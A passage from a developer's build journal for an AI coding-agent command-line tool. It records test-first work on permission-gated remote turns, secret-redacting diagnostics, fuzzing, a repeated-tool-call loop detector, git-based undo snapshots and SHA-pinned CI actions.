the reason is sharper now than when the item was written: since L32.3 a rewind restores a *whole
tree*, so an `/undo` in one session takes back what the other did in the same checkout. That is a
thing to be told once, not discovered.

**The rule is narrow on purpose.** Only live sessions count — an idle one holds no lock and runs no
turns, so it competes for nothing. A session with no recorded directory is skipped rather than
guessed at, because a warning about nothing is how warnings come to be ignored. Three sessions in one
directory produce one warning, not three: the fact a person needs is that this checkout is contended.
And the output is ordered, so the same situation reads the same way twice.

**The interesting part was not the rule but what surfacing it cost.** `SharedCheckouts` alone would
have been another export with no caller — the exact thing this repository has a ratchet for. Wiring
it into `kolk sessions` gave `session.Overview` its first non-test caller, and
`TestTheDeadExportAllowlistDoesNotRot` failed **within one run**: *"Overview has non-test callers now
and no longer needs an exemption."* The entry is deleted. It had said "built for I26.7, which has not
landed yet" since the day it was written, and it turned out to be I27.5 that needed it, not I26.7 —
which is what an exemption with a reason is for: it made the wrong prediction visible instead of
letting a dead export sit.

**The other entry was audited rather than assumed.** `NewPlainRenderer` still has no caller, and its
reason said "waiting on I26.7's remote client". I26.7 has now partly landed — the command and the
route — so that sentence had quietly become misleading: it reads as waiting on something already
done. The half that actually needs an event-to-text renderer is the *client page*, and the reason now
says so. Correcting a reason costs one line; leaving it to rot costs the next reader's trust in every
other line in the file.

Acceptance checklist:

- [x] five tests written first, one per property of the rule including its two exclusions.
- [x] the smallest queued leaf built properly rather than three started.
- [x] the warning surfaced, not merely computed, so it is a feature and not an export.
- [x] the allowlist entry deleted by the rot test on schedule, not by memory.
- [x] the second entry checked against the code and its stale reason corrected.
- [x] full `make check` green: 2,210 tests, 0 lint issues.

### I26.7b built — serving the turn route, and the thing it cannot do

**The design question was answered by reading, not by building.** `kolk serve` owns a bus, a device
store, a permission resolver and a socket — and **no agent**. A standalone server has nothing to
steer. The tempting fix is a supervisor that spawns or adopts a session, which is exactly what item
27 refused ("restart needs to know how it started, logs need somewhere kept, health needs defining")
and item 29 refused again. So the route says so: **501, "this server is not attached to a session, so
there is nothing to ask"**, and a host process that does own a session mounts the handler and
supplies a `TurnStarter`.

That is the precedent `PermissionResolver` already set in this package — a port the host fills, a
clean refusal when it is nil — and following it was better than inventing a second pattern for the
same shape of absence.

**Four properties, four tests.** The route needs a credential like every route but the two that say
nothing. A device paired at **read** is refused with 403 while a **steer** device gets 202 — and the
test asserts the read device's prompt never reached the starter, because a 403 that still ran the
turn would pass a status check. The command's own rules are the server's rules. And an accepted turn
reaches the session with exactly the prompt that was sent.

**`protocol.ValidateCommand` is now exported, and that is the point.** The alternative was
`internal/serve` deriving "what is a valid turn.start" for itself, which is two copies of one
decision and two chances to disagree. The contract package validates; the server applies. An unknown
command is an error there rather than a pass, because a server that accepted what it could not name
would be guessing.

**The steer-route ratchet fired, which is why this leaf was safe.** Mounting `/v1/turns` made
`TestOnlyOneRouteNeedsSteer` fail — adding a write endpoint without listing it would have left it
answerable by any paired device, silently. The list grew on purpose, the test was renamed to
`TestOnlyTheActingRoutesNeedSteer`, and its comment now records why there are two: both entries let a
device *act*, one by answering a prompt and one by asking for work.

**What a remote turn still cannot do:** bypass anything. It hands a prompt to the same agent a local
prompt reaches, so the permission tier, the hardline floor and the doom-loop guard all apply
unchanged. The port's documentation says that in the one place a future implementer will read it.

Acceptance checklist:

- [x] whether `serve` owns an agent checked in code before any design was chosen.
- [x] the supervisor refused, and the refusal made visible as a 501 with a sentence.
- [x] the existing nil-port precedent followed rather than a second pattern invented.
- [x] the read-tier test asserts the turn did not run, not merely that the status was 403.
- [x] validation exported so the contract has one definition, not two.
- [x] the steer ratchet satisfied deliberately, with the reason recorded in the test.
- [x] full `make check` green: 2,204 tests, 0 lint issues.

### I26.7a built — the `turn.start` command

I26.7 is "the remote client — the dash page, authenticated, able to steer", and it has two halves: a
command a device can send, and a page that sends it. This tick built the first, because the page
cannot be written against a command that does not exist and the command is where every rule lives.

**It follows `turn.cancel` rather than inventing a third shape.** A catalogue entry, a typed payload,
a JSON Schema, a golden fixture, a validator, and an OpenAPI operation — the same six things the two
existing commands have. Nothing here is new machinery; the leaf is a vocabulary addition, which is
exactly what item 26 said steering would be.

**The prompt is bounded at 32 KiB, and the reason is not request size.** A prompt is not a one-off
cost: it enters the conversation and is carried in *every later request to the provider*, so an
unbounded remote prompt is an unbounded bill as well as an unbounded body. The limit is far past
anything a person types on a phone and far short of anything that hurts. Empty and whitespace-only
prompts are refused too — a device that asks for nothing should get an error, not a turn.

**Three ratchets fired, all correctly, and they are the reason this was a small leaf rather than a
risky one.** `TestCommandVocabularyIsClosedAcrossCodeSchemasAndGoldens` refused a catalogue entry
with no conformance validator and no schema. `TestOpenAPIMutationsAreDerivedFromShippedCommands`
noticed the shipped command had no operation. `TestOpenAPIContainsOnlyOwnerStableOperations` refused
the new path until it was declared owner-stable on purpose. And the spec guard required a CHANGELOG
entry before it would let the contract change at all. Four independent objections to one addition,
each naming exactly what was missing.

**What is deliberately not here:** the route, the tier check, and the page. `POST /v1/turns` is
declared in the contract and not yet served — which is the honest order, since I26.2's ratchet means
a new route must be added to the protected set on purpose, and a remote turn must go through the same
permission tier and the same doom-loop guard as a local one. That is the next leaf, and it is where
the security work is.

Acceptance checklist:

- [x] five tests written first, including the two refusals (empty prompt, oversized prompt).
- [x] the existing command's shape followed rather than a third invented.
- [x] the bound justified by the recurring cost, not by request size.
- [x] every ratchet that objected was satisfied by fixing the contract, not by widening the test.
- [x] the spec change recorded in `spec/CHANGELOG.md` as the guard requires.
- [x] full `make check` green: 2,194 tests, 0 lint issues, spec guard 29 checks.

### L21.2 built — `--debug`, and item 21 is complete

**The first question was whether to build it at all**, because every session already writes a
per-session NDJSON log of protocol events — and checking found that the bus scrubs every event
through `redact.ScrubJSON` at `Publish`, before it reaches a subscriber or the spill file. So the
"one file per session, redacted" half of the decision was already true for events.

`--debug` is therefore for what the event stream **cannot** say: which model was chosen, what the
effort dial resolved to, where the key came from, what the base URL is. Diagnostics for whoever
maintains kolk, not a record for a client to replay. Duplicating protocol events into it would have
been a second copy of the same facts, which is the version of this feature worth refusing.

**Two rules, and one design choice that protects both.** Off unless asked for — a diagnostic that
writes itself on every run is a second copy of the session nobody chose to keep. And every line is
scrubbed **on the way in**, inside `Printf`, not by its callers: a scrubber a caller can forget is a
scrubber that will be forgotten. The choice that holds them: **a nil `*debugLog` is the off state and
every method tolerates it**, so no call site needs an `if` beside it — which is how `--debug` avoids
growing a branch next to every interesting line and then losing one.

The test asserts not merely that a key is absent but that **no twenty-character prefix** survives,
the same bar `kolk doctor` set, because a prefix is searchable in a leaked log.

**Running it found the defect the tests did not.** The header recorded `mode `, `effort `,
`permission ` — empty — because it was logging the *flag* values, and a flag left unset is empty
while the run is not. A diagnostic that misreports the settings the run actually used has failed at
the one thing it exists for. The line moved to after the agent is built and now reads
`mode code, effort medium, permission ask`. This is the second leaf running where reading the
binary's real output found what the unit tests could not.

With this, **item 21 is complete**: the error matrix (L21.0), `kolk doctor` (L21.1), `--debug`
(L21.2), fuzzing (L21.3) and digest-pinned actions (L21.4). Of the two gaps that item recorded, one —
floating CI action pins — is now closed; the other, prompt injection, remains documented rather than
defended, which is what it said.

Acceptance checklist:

- [x] the existing event log checked before building, and found already scrubbed.
- [x] the overlap decided rather than duplicated: this file records what events cannot.
- [x] four tests written first, including the searchable-prefix bar.
- [x] the nil-log off state made the default so no call site needs a branch.
- [x] the binary run and its output read, which found the empty-settings defect.
- [x] full `make check` green: 2,183 tests, 0 lint issues.

### L21.1 built — `kolk doctor`

Keys, directories, terminal and reachability, with the rule item 21 set: **it prints what it found,
never what it found with.** A diagnostic exists to be pasted into a bug report, so the useful thing —
sharing it — must not also be the dangerous thing.

Four properties are tested, and three of them are about restraint. A key appears as `redact.Mask`
renders it, and the test asserts not merely that the whole key is absent but that **no twenty-character
prefix** survives either, since a prefix is something a person can search a leaked log for. Home
paths are collapsed through `compactWorkingFolder`, the shortener the TUI already uses, so a report
does not name whoever ran it. And doctor **never fails the command**: someone runs it because
something is already wrong, so exiting at the first failed check would hide the rest of the report
exactly when it is wanted. A test drives it with the network pointed at a dead port and asserts the
terminal section still prints.

**The parity rule did its job the moment the verb landed.** Adding `doctor` to the command table made
`TestTopLevelAndSlashParity` fail for want of a `/doctor` twin — the property is by construction, and
it noticed within one test run. `kolk help` and the completion verb list follow from the same table.

**Running the binary found the flaw the tests could not.** The first version marked "interactive
terminal" and "colour" with ✓/✗, so a piped `kolk doctor` reported two failures. A piped kolk is not
a broken kolk, and a ✗ beside a fact sends someone looking for a fault that is not there — which is
the specific way a diagnostic wastes an evening. Those lines are now neutral facts: *output is
redirected, not a terminal*; *colour off while redirected*. Verdict marks are reserved for things
that are actually wrong.

**Two claims elsewhere were true and are now false, so they were fixed.** Item 21 said `kolk doctor`
was queued; item 21 also recorded that `provider.Advise` had been deliberately worded around it while
it did not exist. The transport advice now names it, which is what it wanted to say in the first
place — and that whole episode is the reason item 22 later turned "never document a command that does
not exist" into a test.

The network check asks whether OpenRouter answers, not whether a model does: five-second timeout,
`GET /models`, no turn spent. "Can this machine reach the provider" is the question; a model call
would answer a different one at a price.

Acceptance checklist:

- [x] five tests written first, four of them about what must not appear in the output.
- [x] key material bounded to the last four characters, with a prefix search asserted absent.
- [x] the report finishes when a check fails, proven with a dead network.
- [x] the parity rule satisfied through the table, not by hand.
- [x] the binary run and its output read, which is what found the ✗-on-a-fact flaw.
- [x] the two now-stale claims about doctor corrected where they were written.
- [x] full `make check` green: 2,179 tests, 0 lint issues.

### L21.3 built — fuzzing the two places bytes become control flow

Item 21 accepted this and named the reason: the SSE reader and tool-argument decoding are where a
third party's bytes turn into control flow, and every hand-written fragmentation test encodes a
fragmentation somebody thought of.

**The reader needed a seam first.** The stream loop lived inside `streamChat`, between an HTTP
response and a timer, so it could only be exercised through a test server — far too slow to fuzz.
It is now `readStream(body, meta, onToken)`, a behaviour-preserving extraction with the existing
provider tests as the net; they passed unchanged before anything new was written.

**The invariants are the point, not the absence of a panic.** A fuzz target that only asserts "did
not crash" would have passed on the day this reader dropped a token. What is asserted instead:
every token handed to the caller reconstructs the final content exactly, in order and once — a
streaming UI that shows something the message does not contain is lying, and one that drops a token
loses work; no empty token is ever streamed, since it paints nothing and costs a redraw; and a tool
call that survives is normalised, with an index of zero and a type, because callers downstream branch
on both. A second target asserts the one reordering the reader is allowed to do: deltas arriving out
of order come out sorted by index, which is what makes a two-tool turn execute in the order the model
meant.

**For tool dispatch the invariants are about what must not happen**, because the interesting failures
there are silent. The guard in the fuzz target refuses everything, so any tool reporting success has
run without permission. Malformed arguments must be refused rather than decoded into zero values and
acted on — an edit whose path failed to parse would otherwise write to `""` — and a name the
catalogue does not have must never run anything.

**Seeds are the real shapes**, including the fragmentations the hand-written tests already cover:
split content deltas, a tool call assembled across chunks, out-of-order indices, keep-alives,
usage-only chunks, a truncated final line, and an error chunk.

Run for 45 seconds each: **573k executions** on the reader, **194k** on the ordering target, **694k**
on tool dispatch. No failures. The generated corpus lives in the build cache rather than the
repository, and nothing was added to `.gitignore` — a *failing* input is written to `testdata/fuzz/`
and belongs in git, because that is a regression seed and not litter.

Acceptance checklist:

- [x] the reader extracted behaviour-preserving, with the existing tests green before new ones were written.
- [x] invariants asserted, not merely absence of panic — a dropped or invented token fails.
- [x] tool dispatch fuzzed against a guard that refuses everything, so an escape is a failure.
- [x] seeds taken from the fragmentations the hand-written tests already encode.
- [x] over 1.4 million executions across three targets, no failures.
- [x] full `make check` green: 2,174 tests, 0 lint issues.

### L30.3 built — item 30 is complete

The last item-30 leaf, and mostly a decision about where a small piece of text belongs.

**The layering settled the obvious idea.** Item 21's `provider.Advise` already prints at all three
places a turn can fail, so putting the doom-loop line there would have been free. It cannot go there:
`DoomLoopError` is an engine type and `internal/provider` is L3, a layer below L4, so `Advise` cannot
see it. `internal/cli`'s `writeAdvice` is the correct home, and it is the better one anyway — the
surface is exactly where the two stops have to sound like each other.

**One phrase, held by a constant and a test.** `doomLoopPhrase` is now used by the saga's
chapter-level stop and the turn-level one. A user who meets the second should recognise it from the
first; two vocabularies for one failure teach people that the words do not mean anything in
particular. A test asserts the saga's line still contains it, so rewriting either message fails the
build and the author has to change both on purpose.

**The error message got shorter, not longer.** `DoomLoopError.Error` said the whole story — tool,
count, arguments, and that the turn was going nowhere — and the surface then printed the same story
again underneath it. It now says `stopped: read_file repeated without progress`, and the advice lines
carry the detail and the next action. The next action names `/undo` and closes off the wrong
instinct: *raising effort will not help, the limit is three whatever the budget.*

With this, **item 30 is complete** — the detector (L30.1), the tiered responses (L30.2), the surface
(L30.3) and the proof that the round ceiling is no longer doing the detector's job (L30.4).

Acceptance checklist:

- [x] the layering checked before wiring, not after — L3 cannot see an L4 type.
- [x] the shared phrase made a constant so it cannot drift silently.
- [x] a test pins the saga's line to the same phrase, so both change together or neither does.
- [x] the raw error shortened once the surface carried the detail, so nothing is said twice.
- [x] provider advice proven still to work, since this is an addition and not a replacement.
- [x] full `make check` green: 2,118 tests, 0 lint issues.

### L30.2 built — the tiered response

The interim behaviour L30.1 left — every tier gets full-auto's answer — is gone. What replaced it
turned on a detail the loop prompt flagged before the tick began, and it was right to.

**The observation point had to move.** L30.1 observed a call *after* it settled, which is where the
result half of the rule comes from — but the decision is that the third call is never made. So there
are now two entry points: `wouldRepeat` checks a **pending** call against the two that already
settled, and `observe` still records the settled ones. The precondition falls out of that split
rather than being asserted: two prior calls whose results *differed* are not two-thirds of a loop, so
a pending third is not blocked. That has its own test.

**Each tier answers the question "who is there to ask", and each has a behavioural test**, because
the unit tests prove the rule and not the wiring:

- **`/ask` and `/auto-approve`** ask, and the question says why — "it has already run twice with the
  same arguments and the same result". Answering yes calls `allowRepeat`, which clears the count; a
  test asserts that, because a "yes" that left the counter at two would ask again on the very next
  call and would have meant nothing.
- **`/full-auto`** stops and names the tool and the arguments it stopped. Proceeding is the behaviour
  the guard exists to prevent, and a guard that yields in the tier with the largest budget is
  decoration.
- **A subagent** is refused once, with the loop named in the tool result so the model has to react to
  it, and a **second** trigger ends the child's turn. Subagents run their own tool loop in
  `orchestrator.go`, so they get their own detector — two children repeating different calls are two
  pieces of work, not one loop.

**No standing rule is ever offered.** The `Confirmation` goes out with an empty `Rule`, and a test
asserts it: "always allow" here would mean "always allow me to spend your budget achieving nothing",
and it would disable the guard for every future loop in the session to get past one call.

**The guard is not a permission rule, and there is now a test that says so.** A session carrying
`allow *(*)` — the widest rule the system can express — still stops on a doom loop. `allow bash(*)`
answers "is this dangerous?"; this answers "is this futile?", and collapsing them would let a
reasonable permission rule silently remove a spending guard.

One lint finding worth keeping rather than silencing: `answerDoomLoop` returned `(error, string)`,
and ST1008 asked for the error last. Swapping it is the right shape — the denial text is the normal
outcome and the stop is the exception.

Acceptance checklist:

- [x] the pre-execution check written test-first, including the case where the two prior results differed.
- [x] all four tier behaviours built, three with behavioural tests through a real turn.
- [x] "run it again" proven to clear the count, not merely to allow one call.
- [x] the absence of a standing-rule offer asserted, not assumed.
- [x] a wide-open permission rule proven not to disable the guard.
- [x] the subagent given its own counter, in its own loop, rather than sharing the parent's.
- [x] full `make check` green: 2,115 tests, 0 lint issues.

### L30.1 built, and L30.4 arrived with it — the doom-loop detector

Built to item 30's rule: a loop is three consecutive tool calls with identical **canonical**
arguments *and* identical results. Nine unit tests were written first, one per property, and they are
the specification in executable form — a changing failure is progress, a succeeding repeat is still
waste, an edit between two test runs is not a loop, three spellings of one call are one call, and
three edits differing by a space are three edits.

**Canonicalisation goes exactly as far as the decision said and no further.** JSON is re-serialized
with sorted keys and no insignificant whitespace, because providers spell the same call differently
and a formatting difference is not a different intention. Nothing else is normalized. Arguments that
are not valid JSON are compared as the text they are, since a model sending the same malformed blob
three times is looping too — a case the doc did not raise and the tests now pin.

**One property the doc implies but does not state, added because the tests forced the question:** a
loop is reported *once*. Without that, a stuck model produces a prompt per round while the user is
deciding what to do about the first one.

**L30.4 arrived early, as a failure.** `TestTurnExceedsMaxToolRounds` drove five identical calls to
reach the round ceiling, and the new guard caught it on the third — so the test failed with the wrong
error. That is the leaf's own thesis demonstrating itself: the ceiling was never a detector, and a
fixture that repeated one call was measuring the wrong thing. The fixture now varies its path so it
tests the ceiling for the reason the ceiling exists (work that is varied and simply too long), and a
new test asserts a repeated call at **max effort** stops on round three rather than round fifty-one.
Both tests now fail for their own reason, which is what L30.4 asked for.

**The interim response is full-auto's, in every tier, and it is named as interim.** L30.2 brings the
tiered answers — ask, abort, auto-deny. Until then a detected loop ends the turn with a
`DoomLoopError`. That is strictly better than the status quo it replaces, where the same loop runs to
the ceiling and is paid for every round, and it is the safe direction to be wrong in. The comment at
the call site says which leaf replaces it.

Acceptance checklist:

- [x] nine unit tests written first, each naming one property of the rule.
- [x] the malformed-arguments case decided and pinned, though the doc did not raise it.
- [x] report-once added because the tests exposed the prompt-per-round consequence.
- [x] the existing ceiling test found to be measuring the wrong thing, and fixed rather than adjusted.
- [x] L30.4's assertion built while its subject was in hand.
- [x] the interim tier behaviour marked at the call site with the leaf that replaces it.
- [x] full `make check` green: 2,109 tests, 0 lint issues.

### L32.4 closed and L32.5 built — the store is visible, mortal, and still nobody else's business

**L32.4 was already satisfied, and saying so was the work.** Item 32 asked for a permanent test that
the user's own git state is untouched. L32.1 added one over three snapshots (reflog, stash list,
index) and L32.3 added one over a rewind (reflog, HEAD, working status). Between them both halves of
the dangerous surface are covered, so a third test would have been ceremony. The audit did find one
asymmetry: the rewind guard checked HEAD but not the stash stack. `git stash` is the obvious wrong
way to build this feature, so the test that says we did not use it belongs on both halves — the
assertion was added rather than a new file.

**L32.5's deletion half turned out to be true by construction.** `session.Delete` already
`RemoveAll`s the whole `<id>.ckpt` directory, and the store lives inside it at `shadow.git`. That is
the right shape and it was luck rather than design, so it now has a test whose comment says what it
is protecting against: someone later replacing `RemoveAll` with a list of known filenames, at which
point a store would quietly outlive the session it belonged to.

**The size column reports only when there is something to report.** `snap:78KB` appears beside a
session that has snapshots and nothing appears beside one that does not, because a column of
`snap:0B` on every row teaches people to stop reading the line. One `os.Stat` decides which case a
session is in before any directory is walked — most sessions have no store, and a listing that walked
a directory per session would be the *second* time a convenience made a command slow here. The first
was the benchmark that turned `Overview` 20× slower and left 549 lock files in the user's real
sessions directory; that lesson is why the stat comes first.

Acceptance checklist:

- [x] L32.4 audited against what the two existing tests actually assert, not against their names.
- [x] the one real gap found by that audit — stash on the rewind side — closed in place.
- [x] the deletion guarantee pinned by a test, though the code already had it by accident.
- [x] the size column silent when empty, and gated behind a single stat.
- [x] full `make check` green: 2,099 tests, 0 lint issues.

### L32.3 built — rewind from either store

The leaf the whole item was for. `/undo` now puts back a change kolk never made: a formatter, a
codegen step, an `rm`.

**The manifest records which store captured each turn.** `Snapshots` maps a turn to its shadow
commit, and a turn appears there or in `Entries`, never both — so a session that gained or lost `git`
half-way through rewinds each turn the way that turn was recorded. That is item 32's migration answer
made real, and it is why `Record` could finally become a no-op under the shadow strategy: the opening
snapshot already contains every path, and recording both ways would make one turn recoverable twice,
which is how two stores come to disagree.

**A rewind is the most destructive thing in this package, and two bounds hold it.** Everything runs
with `GIT_WORK_TREE` set to the project, so git cannot reach outside it whatever the snapshot holds.
And `git clean` runs **without `-x`**, so a file the project ignores — build output, a local `.env` —
is left alone: the snapshot never held it, so putting the tree "back" cannot mean deleting it. That
one has its own test, because losing a build directory to an `/undo` would be a surprise nobody asked
for.

Paths are read *before* the restore, not after — afterwards there is by construction nothing left to
compare — and the listing unions `diff --name-only` with `ls-files --others`, because a file created
since the snapshot is untracked in the shadow index and is exactly the case `/undo` must report.

**Four tests replaced the interim guard L32.2 left.** A `bash`-made edit is undone and a `bash`-made
file is deleted; the user's reflog, HEAD and index are untouched *after a rewind* as well as after a
snapshot; ignored files survive; and a session outside a repository still rewinds through the copy
store. The first of those failed for exactly the right reasons before the code existed.

**`TestNoInventedContexts` fired again**, and again it was right. `rewindSnapshot` reached for
`context.Background()` because `RewindLastTurn()` had no context — but a rewind now shells out to
git, so a cancelled `/undo` should be able to stop. The port is `RewindLastTurn(context.Context)`,
and `Agent.Undo` and `Agent.Rewind` take one too. Two leaves in a row, this rule has caught a real
design gap rather than a style nit: both times the missing context marked exactly the place where
cheap bookkeeping had quietly become I/O.

**One ordering care worth recording:** the snapshot commit is written to the manifest before the turn
proceeds, and if that write fails the snapshot is dropped from the index and the session falls back.
A commit the manifest does not name is one no rewind can find, so keeping it would be worse than not
taking it.

Acceptance checklist:

- [x] four tests written first; the headline one failed on all three of its assertions.
- [x] the destructive path bounded twice — work tree confinement, and no `-x` on clean — each tested.
- [x] `Record` became a no-op only once rewind could read the other store, not before.
- [x] the manifest records the strategy per turn, so a mixed session rewinds correctly.
- [x] the invented context replaced by a real one through the port, engine and slash callers.
- [x] full `make check` green: 2,096 tests, 0 lint issues.

### L32.2 built — strategy selection, fail-closed

`Store.UseShadow` attaches the shadow store when the project qualifies and says nothing when it does
not qualify for a reason nobody can act on. Selection uses `projectRoot()` — the same root the file
tools are confined to — so the snapshot and the path jail cannot disagree about what the project is.
There is no git version check, as item 32 decided: opening the store *is* the probe.

**Three failure modes, one answer.** Not a repository, no git on `PATH`, a store that will not open:
all fall back to copying, because the alternative to snapshotting is never failing the turn. A
failure *after* selection — a cleaner, a full disk, a bug — drops the session to copying for the rest
of its life rather than retrying every turn, and the notice is set once and never rewritten: a
fallback that re-announced itself each turn would be noise about a decision already made. Both
properties are tested, including that the notice does not change on a later turn.

**Record deliberately stays a copying Record.** Item 32 says it becomes a no-op under the shadow
strategy, and it will — but not until L32.3 teaches rewind to read the shadow store. Making it a
no-op now would leave `/undo` restoring nothing between two checkpoints, which is a regression
wearing a feature's name. `TestRecordKeepsWorkingWhileTheShadowStoreIsActive` pins that until L32.3
removes it.

**The architecture rules did two useful things in this leaf.** The dead-export rot test fired the
moment `OpenShadow` gained a real caller, forcing the allowlist entry L32.1 added to be deleted —
exactly the one-checkpoint deadline it was given. And `TestNoInventedContexts` rejected the
`context.Background()` inside `snapshotTurn`, which was the right call rather than an inconvenience:
`BeginTurn()` had no context because nothing in it had ever needed one, and a snapshot is I/O that a
cancelled turn should be able to abandon. The port is now `BeginTurn(context.Context)`, threaded from
the turn's own context through the engine, both fakes and five test files.

Verified afterwards that the suite left no `shadow.git` anywhere in the real data directory — the
lesson from the benchmark that once wrote 549 lock files into the user's sessions.

Acceptance checklist:

- [x] four tests written first, all failing on an undefined `UseShadow`.
- [x] the same project-root test as the path jail, not a second opinion about the project.
- [x] fallback proven for both timings — at selection, and mid-session — with the notice pinned as write-once.
- [x] the `/undo` regression avoided rather than accepted, with a test naming why.
- [x] the allowlist entry deleted by the rot test on schedule, not by memory.
- [x] the invented context replaced by a real one instead of silenced.
- [x] no stray stores left in the user's own data directory.
- [x] full `make check` green: 2,093 tests, 0 lint issues.

### L32.1 built — the shadow store

Built to item 32's decision rather than re-deciding it: a bare git object store outside the work
tree, every command carrying an explicit `GIT_DIR` and `GIT_WORK_TREE`, `objects/info/alternates`
pointing at the project's own object database, and the five configuration settings the design named.

**Paths never enter the command line.** `shell.Cmd.Command` is interpreted by the platform shell, so
a project directory containing a space or a quote would be a bug waiting for the right folder name.
The store passes `GIT_DIR` and `GIT_WORK_TREE` as environment instead, where they are data. Identity
is fixed to `kolk@localhost` for the same class of reason: a snapshot is machinery, not authorship,
and reading the user's `user.email` would fail on a machine where it was never set.

**One thing the design did not anticipate**, found by the tests: `git init` refuses to run with
`GIT_WORK_TREE` in the environment — *"GIT_WORK_TREE not allowed without specifying GIT_DIR"* — even
when `GIT_DIR` is also set. Creation is the one command that must not see a work tree, and there is
nothing to work on at that point anyway, so it takes the directory as an argument and no `GIT_*`
environment at all.

**The four tests, and which one matters most.** That a `sed`-style change made outside kolk shows up
in the store. That the alternates file points at the project's objects. That a directory with no
`.git` is refused, so the caller falls back to copying. And
`TestShadowNeverTouchesTheUsersOwnGitState`, which takes three snapshots over a dirty tree and
asserts the user's reflog, stash list and index are unchanged — with a guard that fails if the test
never dirtied the tree, because a test that proves nothing passes very reliably. Its comment says it
must not be deleted, and it means it: if that test ever fails, kolk is writing into somebody's
repository behind their back.

**The measured numbers held.** Run against this repository through the built code rather than by
hand: **54 ms** first snapshot, **21 ms** after, **78 KB** store — against the design's 63/15/148 from
the hand-run experiment. Same shape, and the store is smaller than predicted.

**The dead-export ratchet fired, correctly.** `OpenShadow` has no caller until L32.2 selects between
the two stores, and the rule offered its three options: wire it, delete it, or allowlist it with a
reason. It is allowlisted with the reason and a deadline — the rot test fails the build the moment
`OpenShadow` gains a real caller, so the entry cannot outlive its purpose by more than one
checkpoint. That is the allowlist working as designed rather than accumulating, which is the
distinction item 19 drew when it deleted the SQLite allowance.

Acceptance checklist:

- [x] four tests written first, all failing on an undefined `OpenShadow`.
- [x] built to the hardened decision — no re-deciding of cadence, alternates or the version question.
- [x] the git-init constraint found by a test rather than by a user.
- [x] the cost re-measured through the built code and recorded against the design's estimate.
- [x] the never-delete test carries a guard against being vacuously green.
- [x] full `make check` green: 2,089 tests, 0 lint issues.

### L21.4 built — every action pinned by commit SHA

The first build leaf after the plan finished hardening, and the one item 21 named as a real if
bounded exposure: the release and smoke workflows pinned every action by digest, while `ci.yml` ran
`actions/checkout@v5`, `actions/setup-go@v6` and `golangci/golangci-lint-action@v8` — nine floating
references across four jobs.

A tag is a moving pointer its owner can repoint at any time, so `@v5` does not mean a version, it
means *whatever that account publishes next*. That is a credential decision wearing a version
number. The exposure in these jobs is bounded — they can read the repository and nothing else — but
"bounded" is not "absent", and the two workflows that would matter most were already pinned, which
made the inconsistency the whole finding.

`scripts/test-workflow-pins.sh` was written first and failed on all nine. The rule is mechanical: a
40-character hex SHA, plus a `# vN` comment naming the human-readable version so a reader can see
what the digest is meant to be and confirm it with
`gh api repos/<action>/git/ref/tags/<tag>`. Local actions (`./…`) are exempt, because a path into
this repository is not a third-party reference.

Each tag was resolved through `gh api` rather than copied. Two of the three answers —
`actions/checkout@v6` at `d23441a4…` and `actions/setup-go@v6` at `924ae3a1…` — matched the digests
`release.yml` already carried, which is a useful cross-check on both files at once.
`golangci-lint-action@v8` resolved to `4afd733a…`.

**One thing changed beyond pinning, and it is worth saying rather than burying:** `ci.yml` was on
`actions/checkout@v5` and is now on v6's digest. That is a major-version bump, not just a pin. It is
the version `release.yml` has been running successfully, which is why it was chosen over resolving
`v5` — but it is a behaviour change, and if CI fails on checkout it is this line.

Both mutations were run: repointing one pin back to `@v5` fails, and stripping a `# v6` comment from
a correct digest fails. Wired into `make check` and the CI guardrails job — 43 checks.

Acceptance checklist:

- [x] contract written first, red on all nine floating references.
- [x] every digest resolved with `gh api`, not copied from memory; two cross-checked against release.yml.
- [x] both failure modes mutation-tested — a moving tag, and a digest with no version comment.
- [x] the v5 → v6 bump called out rather than smuggled in with the pinning.
- [x] full `make check` green: 2,085 tests, 0 lint issues.

### Item 31 hardened — the plan has no unhardened items left — recorded detail

Three of this item's four questions had shipped as E13.7 before the item was written down, so most of
it is a record. The one open question was whether to replace an eighteen-entry heuristic with
somebody else's 139-entry arity table, and the item said to measure before importing.

**So it was measured.** Every command in this repository's `Makefile`, `.github/workflows/` and
`scripts/` — 57 after filtering shell fragments — was run through `generaliseCommand` and the output
read line by line. It was right on 55.

**The two failures were not about arity, which is the finding.** `goreleaser check` derived
`goreleaser *`, and `cosign verify-blob …` derived `cosign *`. `goreleaser check` validates a config
file; `goreleaser release` **publishes to the internet**. `cosign verify-blob` reads; `cosign sign`
signs. The mistake is not "the prefix was too short" — it is that **the derived rule permits a
strictly more powerful command than the one that was approved**. An arity table fixes exactly that for
the 139 programs it lists and reproduces it exactly for the 140th, which is the tail: where a table is
weakest, and where its upkeep is dearest, since 139 rows generated by someone else's LLM have to stay
correct as programs grow subcommands.

**So: no table.** `commandDrivers` stays small and grows by evidence — one program at a time, each
addition made on purpose by someone who saw a rule they would not have chosen. This measurement grew
it by two, both regression-tested by name with the reason in the test, and a second test pins what
must *not* change: `gofmt -w .` stays `gofmt *`, because a flag is not a subcommand and there is
nothing to keep.

**Two refusals.** The exact command as a third choice at the prompt: refused, because that is already
`y` — it runs the command and stores nothing — and a stored rule matching one exact invocation with
its arguments will never match again, so it would add a third key to every prompt to produce a rule
with no future. And a compound command may never become an `always` rule: a rule is a prefix match,
and a compound command has no prefix that means anything without parsing shell grammar to guess which
half the user agreed to.

**With this item, every item in PLAN.md is hardened.** Items 1, 24 and 25 remain `[~]` by design —
each tracks something the world keeps changing — and everything else from 2 to 32 has a document, a
tick, and now a ratchet (L23.1) that fails the build if those two ever disagree.

What remains is build work, not decisions: L21.1 `kolk doctor`, L21.2 `--debug`, L21.3 fuzzing the
SSE and tool-argument parsers, L21.4 pinning `ci.yml`'s actions, L30.1–L30.4 (the doom-loop detector),
L32.1–L32.5 (shadow-git snapshots), I26.7, the I27–I29 leaves, G16 and T0.5.

Acceptance checklist:

- [x] the item's open question answered by measurement rather than preference.
- [x] the measurement's finding stated as what it was — a power asymmetry, not an arity error.
- [x] the import refused, with the reason the table would not have helped.
- [x] two regression tests: one for what changed, one pinning what must not.
- [x] both refusals resolved with reasoning rather than deferral.
- [x] full `make check` green.

### Item 30 hardened — recorded detail

The item's `Today` line says "nothing at the *turn* level". Reading the code first turned up an
exception worth recording: `RunTurn` already ends a turn after two consecutive empty completions.
That is a loop guard — it catches a model that has stopped producing anything. The gap is the
opposite failure, where the model produces plenty and none of it changes anything.

**Four guards exist, and the shape of the hole between them is exact.** `MaxRoundsFor` bounds a turn
at 4/12/24/50 rounds by effort in code mode — a **ceiling, not a detector**, which is the entire
item: at max effort a model repeating one useless call is stopped on round 51 having been paid for
